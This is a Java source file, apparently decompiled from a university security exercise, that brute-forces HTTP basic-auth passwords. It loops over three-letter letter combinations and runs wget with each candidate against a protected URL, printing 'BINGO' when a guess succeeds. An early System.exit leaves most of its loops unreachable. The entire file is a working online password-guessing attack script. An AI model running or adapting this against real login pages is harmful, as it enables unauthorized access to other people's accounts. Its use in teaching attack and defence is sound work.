import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
class BruteForce {
    public static void main ( final String[] array ) {
        final URLHack urlHack = new URLHack();
        for ( int i = 97; i <= 122; ++i ) {
            for ( int j = 97; j <= 122; ++j ) {
                for ( int k = 97; k <= 122; ++k ) {
                    urlHack.m00 ( new Character ( ( char ) i ).toString() + new Character ( ( char ) j ).toString() + new Character ( ( char ) k ).toString() );
                }
            }
        }
        System.exit ( 0 );
        for ( int l = 65; l <= 90; ++l ) {
            for ( int n = 65; n <= 90; ++n ) {
                for ( int n2 = 65; n2 <= 90; ++n2 ) {
                    urlHack.m00 ( new Character ( ( char ) l ).toString() + new Character ( ( char ) n ).toString() + new Character ( ( char ) n2 ).toString() );
                }
            }
        }
        for ( int n3 = 65; n3 <= 90; ++n3 ) {
            for ( int n4 = 97; n4 <= 122; ++n4 ) {
                for ( int n5 = 65; n5 <= 90; ++n5 ) {
                    urlHack.m00 ( new Character ( ( char ) n3 ).toString() + new Character ( ( char ) n4 ).toString() + new Character ( ( char ) n5 ).toString() );
                }
            }
        }
        for ( int n6 = 97; n6 <= 122; ++n6 ) {
            for ( int n7 = 97; n7 <= 122; ++n7 ) {
                for ( int n8 = 65; n8 <= 90; ++n8 ) {
                    urlHack.m00 ( new Character ( ( char ) n6 ).toString() + new Character ( ( char ) n7 ).toString() + new Character ( ( char ) n8 ).toString() );
                }
            }
        }
        for ( int n9 = 97; n9 <= 122; ++n9 ) {
            for ( int n10 = 65; n10 <= 90; ++n10 ) {
                for ( int n11 = 65; n11 <= 90; ++n11 ) {
                    urlHack.m00 ( new Character ( ( char ) n9 ).toString() + new Character ( ( char ) n10 ).toString() + new Character ( ( char ) n11 ).toString() );
                }
            }
        }
        for ( int n12 = 65; n12 <= 90; ++n12 ) {
            for ( int n13 = 97; n13 <= 122; ++n13 ) {
                urlHack.m00 ( new Character ( ( char ) n12 ).toString() + new Character ( ( char ) n13 ).toString() );
            }
        }
    }
}
class URLHack {
    public void m00 ( final String s ) {
        try {
            final String line = new BufferedReader ( new InputStreamReader ( Runtime.getRuntime().exec ( "wget -nv --http-user= --http-passwd=" + s + " http://sec-crack.cs.rmit.edu./SEC/2/" ).getErrorStream() ) ).readLine();
            System.out.println ( line );
            if ( line.length() == 21 ) {
                System.out.println ( "Invalid Password " + s );
            } else {
                System.out.println ( "BINGO " + s );
                System.exit ( 0 );
            }
        } catch ( Exception ex ) {
            System.out.println ( " ERROR " + ex );
        }
    }
}
